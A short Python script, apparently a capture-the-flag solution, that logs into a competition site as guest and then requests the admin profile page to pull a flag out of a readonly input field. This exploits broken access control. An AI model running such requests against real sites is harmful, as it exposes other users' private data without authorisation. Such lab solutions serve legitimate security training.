import requests
from bs4 import BeautifulSoup

BASE_URL = "https://secuweb-web.2024-bq.ctfcompetition.com"

def login(session):
    login_url = f"{BASE_URL}/login"
    data = {
        "username": "guest",
        "password": "guest"
    }
    resp = session.post(login_url, data=data)
    if resp.status_code in (200, 302):
        print("[+] Logged in successfully!")
        return True
    print(f"[-] Login failed with status {resp.status_code}")
    return False

def fetch_flag(html):
    soup = BeautifulSoup(html, 'html.parser')
    input_flag = soup.find('input', {'type': 'text', 'readonly': True})
    if input_flag and input_flag.has_attr('value'):
        return input_flag['value']
    return None

def fetch_admin_profile(session):
    url = f"{BASE_URL}/profile/admin"
    resp = session.get(url)
    if resp.status_code == 200:
        flag = fetch_flag(resp.text)
        if flag:
            print(f"[+] Flag found => {flag}")
        else:
            print("[-] Flag not found in the page...")
    else:
        print(f"[-] Failed to fetch admin profile: status {resp.status_code}")

if __name__ == "__main__":
    session = requests.Session()
    if login(session):
        fetch_admin_profile(session)
